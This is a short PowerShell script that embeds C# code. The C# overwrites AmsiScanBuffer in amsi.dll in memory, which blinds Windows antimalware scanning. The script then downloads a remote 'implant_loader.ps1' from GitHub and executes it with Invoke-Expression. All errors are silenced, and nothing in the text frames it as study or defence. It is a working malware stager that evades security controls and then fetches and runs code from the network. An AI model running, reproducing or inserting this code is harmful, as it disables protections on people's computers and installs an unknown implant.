$cSharpCode = @"
using System;
using System.Runtime.InteropServices;
public class AmsiPatcher
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Patch()
    {
        try
        {
            IntPtr lib = LoadLibrary("amsi.dll");
            IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
            byte[] patch = { 0x31, 0xC0, 0xC3 };
            uint oldProtect;
            VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, addr, patch.Length);
            VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
        }
        catch // <-- THIS IS THE FIX
        {
            // Silently fail
        }
    }
}
"@

try {
    Add-Type -TypeDefinition $cSharpCode
    [AmsiPatcher]::Patch()
} catch {}

try {
    $url = "https://raw.githubusercontent.com/lucid251/22RAdTOJFD/refs/heads/main/implant_loader.ps1"
    $h = New-Object -ComObject 'Msxml2.XMLHTTP'
    $h.open('GET', $url, $false)
    $h.send()
    Invoke-Expression $h.responseText
} catch {}
